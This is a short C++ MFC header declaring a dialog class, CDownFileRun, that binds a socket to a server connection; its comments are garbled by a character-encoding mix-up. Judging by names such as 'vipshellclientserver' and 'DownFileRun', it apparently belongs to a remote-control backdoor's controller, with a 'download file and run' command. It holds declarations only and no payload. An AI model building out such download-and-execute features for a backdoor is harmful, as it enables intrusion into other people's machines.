#pragma once


// CDownFileRun �Ի���
#include ".\vipshellclientserver.h"

class CDownFileRun : public CDialog
{
	DECLARE_DYNAMIC(CDownFileRun)

public:
	CDownFileRun(CWnd* pParent = NULL);   // ��׼���캯��
	virtual ~CDownFileRun();

// �Ի�������
	enum { IDD = IDD_DIALOG_DOWNFILERUN };
	void BindSocket(SOCKET s)
	{
		m_hServer.Attach(s);
	}
protected:
	CServerConnectHandle m_hServer;
	virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV ֧��

	DECLARE_MESSAGE_MAP()
public:
	afx_msg void OnBnClickedOk();
};
